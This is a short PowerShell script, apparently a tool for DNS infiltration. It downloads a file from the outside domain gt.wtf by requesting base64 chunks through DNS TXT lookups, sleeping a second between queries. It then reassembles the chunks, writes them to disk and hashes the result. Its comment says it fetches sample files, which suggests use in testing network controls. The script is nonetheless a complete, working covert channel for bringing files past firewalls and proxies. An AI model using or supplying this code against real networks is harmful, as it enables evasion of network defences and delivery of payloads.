# gets sample files listed on http://psdnsinfil.gt.wtf/files.htm

$chunksize=180
$FileName="psdnsinfil_output.dat"
$ResourceNumber=1
$BSum=""

for ($i=0; $i -le $chunksize*2500; $i=$i+$chunksize)
{
    $B64string=(Resolve-DnsName -Type TXT -Name "$ResourceNumber-$i-$chunksize.y.gt.wtf").Strings
    if ($B64string -eq "====")
    {
        break
    }
    $BSum=$BSum+$B64string
    Start-Sleep -Milliseconds 1000
}

[IO.File]::WriteAllBytes($FileName, [Convert]::FromBase64String($BSum))
Get-FileHash -Path $FileName -Algorithm MD5 